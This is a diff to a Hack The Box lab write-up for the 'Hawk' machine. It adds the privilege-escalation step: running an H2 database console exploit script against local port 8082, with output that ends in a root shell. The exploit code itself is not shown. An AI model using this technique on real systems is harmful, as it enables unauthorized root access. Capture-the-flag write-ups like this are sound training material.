@@ -248,3 +248,12 @@ We are going to exploit port 8082 you just have to install this tools to be root
 
 [![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/48/6/1543665462-capture-du-2018-12-01-12-57-30.png)](https://hackthebox.eu)
 
+And launch the python file
+
+    daniel@hawk:/tmp$ python3 h2_database.py -H 127.0.0.1:8082                                                                                                     
+    [*] Attempting to create database                                                                                                                              
+    [+] Created database and logged in                                                                                                                             
+    [*] Sending stage 1                                                                                                                                            
+    [+] Shell succeeded - ^c or quit to exit                                                                                                                      
+    h2-shell$ id                                                                                                                                                  
+    uid=0(root) gid=0(root) groups=0(root)
